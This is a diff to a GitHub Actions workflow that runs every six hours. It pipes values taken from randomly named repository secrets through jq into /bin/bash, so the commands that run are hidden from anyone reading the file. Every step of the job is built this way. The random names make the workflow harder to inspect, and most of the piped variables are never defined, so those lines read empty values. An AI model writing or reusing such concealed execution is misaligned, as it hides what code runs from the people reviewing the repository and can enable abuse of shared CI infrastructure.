@@ -3,21 +3,24 @@ name: nengheboxi
 on:
   workflow_dispatch:
   schedule:
-    - cron: '56 1/6 * * *'
+    - cron: '30 0/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: nengheboxi
         env:
-          qvyco92: ${{ secrets.qvyco92 }}
+          tlfw418: ${{ secrets.tlfw418 }}
         run: |
-          echo $qvyco92 | jq -r .ha07867 | /bin/bash
-          echo $wvr84549 | jq -r .sh6 | /bin/bash
-          echo $xekqw4774 | jq -r .ctdru38 | /bin/bash
-          echo $xrha1258 | jq -r .xo90 | /bin/bash
-          echo $vtc2 | jq -r .em6 | /bin/bash
-          echo $kavgh4 | jq -r .sgfnj0 | /bin/bash
+          echo $tlfw418 | jq -r .ev81689 | /bin/bash
+          echo $bimbl667 | jq -r .upvh463 | /bin/bash
+          echo $zy43219 | jq -r .o0210 | /bin/bash
+          echo $nz514 | jq -r .uymqh006 | /bin/bash
+          echo $wmlj09266 | jq -r .bqdf1091 | /bin/bash
+          echo $feat9592 | jq -r .hcqhu59 | /bin/bash
+          echo $a016 | jq -r .hkpvh32 | /bin/bash
+          echo $qisut3302 | jq -r .jglpq19860 | /bin/bash
 
